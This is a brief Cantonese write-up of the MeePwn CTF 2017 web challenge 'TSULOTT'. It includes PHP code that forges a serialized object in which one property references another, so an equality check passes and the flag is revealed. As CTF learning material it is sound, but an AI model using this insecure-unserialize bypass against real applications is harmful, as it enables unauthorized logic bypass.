# MeePwn CTF 2017: TSULOTT 

### (web, 100 points, 161 team solved)

說明
>Who Wants to Be a Millionaire? Join My LOTT and Win JACKPOTTTT!!!

>Remote: 128.199.190.23:8001

## 題解
呢題好 hea. 所以咁鬼多人解到

入面俾你打個 serialized object. 之後 $obj->jackpot = 一堆隨機數字.

之後 if($obj->enter === $obj->jackpot){echo $flag}

你唔會走去估果D數係乜掛. 所以求其整到 $obj->enter = &$obj->jackpot 之後就解到.


```
<?php
class Object  
{  
  var $jackpot; 
  var $enter;  
} 

$obj = new Object;
$obj->enter = &$obj->jackpot;

echo serialize($obj);
echo "<hr />";
echo base64_encode(serialize($obj));
if($obj->enter === $obj->jackpot){echo "<hr>OK";}else{echo "<hr>PK";}
?>
```
唔好問我點解最後係 echo PK.

## 參考資料
http://php.net/manual/en/language.oop5.references.php
